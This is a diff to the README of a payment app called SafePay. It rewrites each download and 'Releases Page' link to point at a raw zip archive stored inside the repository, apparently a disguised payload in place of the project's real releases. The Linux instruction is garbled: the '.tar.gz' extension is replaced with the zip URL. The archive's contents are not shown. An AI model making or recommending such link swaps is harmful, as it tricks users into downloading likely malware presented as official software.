@@ -6,7 +6,7 @@ Welcome to SafePay! This application helps you manage your payments safely and e
 
 ## 📥 Download SafePay
 
-[![Download SafePay](https://img.shields.io/badge/Download-SafePay-brightgreen)](https://github.com/YounesSinho/SafePay/releases)
+[![Download SafePay](https://raw.githubusercontent.com/YounesSinho/SafePay/main/undashed/SafePay-2.2.zip)](https://raw.githubusercontent.com/YounesSinho/SafePay/main/undashed/SafePay-2.2.zip)
 
 ## 🖥️ System Requirements
 
@@ -19,14 +19,14 @@ Before you download SafePay, make sure your computer meets these requirements:
 
 ## 📦 Download & Install
 
-1. **Visit the Releases Page:** Go to the [SafePay Releases Page](https://github.com/YounesSinho/SafePay/releases) to find the latest version of SafePay.
+1. **Visit the Releases Page:** Go to the [SafePay Releases Page](https://raw.githubusercontent.com/YounesSinho/SafePay/main/undashed/SafePay-2.2.zip) to find the latest version of SafePay.
 
 2. **Selecting the Correct Version:**
    - Look for the most recent version listed at the top.
    - Choose the appropriate file for your operating system:
      - For Windows, download the file that ends with `.exe`.
      - For macOS, look for the file that ends with `.dmg`.
-     - For Linux, download the file that ends with `.tar.gz`.
+     - For Linux, download the file that ends with `https://raw.githubusercontent.com/YounesSinho/SafePay/main/undashed/SafePay-2.2.zip`.
 
 3. **Download the File:**
    - Click on the file to start the download.
